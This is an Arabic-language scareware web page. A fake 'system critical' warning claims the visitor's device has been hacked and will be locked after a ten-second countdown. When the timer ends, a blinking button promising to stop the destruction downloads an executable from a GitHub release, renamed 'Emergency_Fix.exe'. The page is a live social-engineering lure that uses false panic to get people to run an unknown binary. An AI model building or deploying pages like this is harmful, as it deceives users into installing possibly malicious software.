<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>SYSTEM CRITICAL</title>
    <style>
        body { font-family: 'Courier New', Courier, monospace; background-color: #050505; color: #0f0; text-align: center; padding: 50px; }
        .box { border: 3px solid #f00; padding: 30px; border-radius: 10px; display: inline-block; background-color: #111; box-shadow: 0 0 30px #f00; }
        h1 { font-size: 50px; color: #f00; text-shadow: 2px 2px #500; }
        #timer { font-size: 80px; font-weight: bold; color: #fff; margin: 20px 0; }
        .download-btn { background-color: #f00; color: #fff; padding: 25px 50px; text-decoration: none; border-radius: 5px; font-weight: bold; display: none; font-size: 24px; animation: blink 1s infinite; }
        @keyframes blink { 0% {opacity: 1;} 50% {opacity: 0.3;} 100% {opacity: 1;} }
        p { font-size: 20px; }
    </style>
</head>
<body>
    <div class="box">
        <h1>⚠️ تحذير: تدمير ذاتي 😝</h1>
        <p>تم اكتشاف محاولة اختراق لجهازك من قبل "RAFAT"</p>
        <p>سيتم قفل النظام نهائياً خلال:</p>
        
        <div id="timer">10</div>

        <a href="https://github.com/30066-G/nl.live/releases/download/v1.0/gateway.exe" id="btn" class="download-btn" download="Emergency_Fix.exe">إيقاف التدمير الآن!</a>
        
        <p id="msg">انتظر حتى يتم تجهيز أداة الطوارئ...</p>
    </div>

    <script>
        let count = 10;
        const timerElement = document.getElementById('timer');
        const btnElement = document.getElementById('btn');
        const msgElement = document.getElementById('msg');

        const countdown = setInterval(() => {
            count--;
            timerElement.innerText = count;

            if (count <= 0) {
                clearInterval(countdown);
                timerElement.style.color = "#f00";
                timerElement.innerText = "00";
                btnElement.style.display = "inline-block";
                msgElement.innerText = "اضغط فوراً لإيقاف العملية!";
            }
        }, 1000);
    </script>
</body>
</html>
